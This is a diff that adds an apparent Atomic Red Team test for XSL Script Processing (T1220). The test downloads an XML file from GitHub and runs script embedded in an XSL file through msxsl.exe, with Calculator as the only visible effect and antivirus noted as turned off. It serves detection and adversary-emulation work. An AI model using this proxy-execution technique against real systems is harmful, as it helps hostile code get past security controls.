@@ -1,0 +1,13 @@
+#TechniqueName: XSL Script Processing
+#AtomicTestName: MSXSL Bypass using local files
+#Description: Executes the code specified within a XSL script tag during XSL transformation using a local payload. Requires download of MSXSL from Microsoft at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe when test sucessfully executed, while AV turned off.&
+#Language: cmd
+
+#get_prereq_commands
+New-Item -Type Directory (split-path PathToAtomicsFolder\T1220\src\msxslxmlfile.xml) -ErrorAction ignore | Out-Null
+Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml" -OutFile "PathToAtomicsFolder\T1220\src\msxslxmlfile.xml"
+
+
+#commands
+C:\Windows\Temp\msxsl.exe PathToAtomicsFolder\T1220\src\msxslxmlfile.xml PathToAtomicsFolder\T1220\src\msxslscript.xsl
+
